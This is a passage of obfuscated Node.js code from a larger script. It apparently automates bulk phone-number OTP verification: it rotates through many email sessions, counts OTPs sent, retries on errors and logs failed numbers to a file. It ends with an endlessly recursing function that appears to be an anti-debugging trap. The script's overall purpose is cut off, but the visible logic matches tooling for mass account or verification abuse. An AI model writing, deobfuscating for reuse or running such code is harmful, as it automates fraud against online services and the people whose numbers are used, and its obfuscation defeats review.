            v695.error = v694, v695.sessionOtpCount = v680 ? v680.otpCount : 0x0, dbg(v681, "phone-otp-error", v695);
            if (v680 && v680.otpCount > 0x0) {
              v633.addLog("Session error for " + v680.email + '\x20(' + v680.otpCount + " sent) — switching to another mail...", "retry"), v680 = null, v683--;
              continue;
            } else {
              v680 = null;
              const v696 = /invalid request|about:blank|unsupported/i.test(v694);
              if (v683 < v684 && !v696) {
                v633.addLog("Session error on " + v681 + ". Switching to another mail (" + v683 + '/' + v626 + ")...", "retry"), await new Promise(v697 => setTimeout(v697, 0x3e8));
                continue;
              } else {
                v633.failed++, v633.processed++, fn9(v681);
                const v698 = v696 ? "Invalid number" : "Session error";
                fs.appendFileSync(FAILED_FILE, v681 + " | " + v698 + '\x0a'), v633.addLog("Failed on " + v681 + ':\x20' + v698, "error"), v685 = true;
                break;
              }
            }
          }
        }
      }
    }
    for (let v699 = 0x0; v699 < v640; v699++) v641.push(fn10(v699));
    await Promise.all(v641), clearInterval(v642), v633.render(), v633.stop();
  } catch (v700) {
    console.error(R("Fatal error: " + v700.message)), process.exit(0x1);
  }
}
isMainThread && main().catch(v701 => {
  console.error(R("  FATAL: " + v701.message)), process.exit(0x1);
});
function fn2(v702) {
  function fn11(v703) {
    fn11(++v703);
  }
  try {
    if (v702) return fn11;else fn11(0x0);
  } catch (v704) {}
}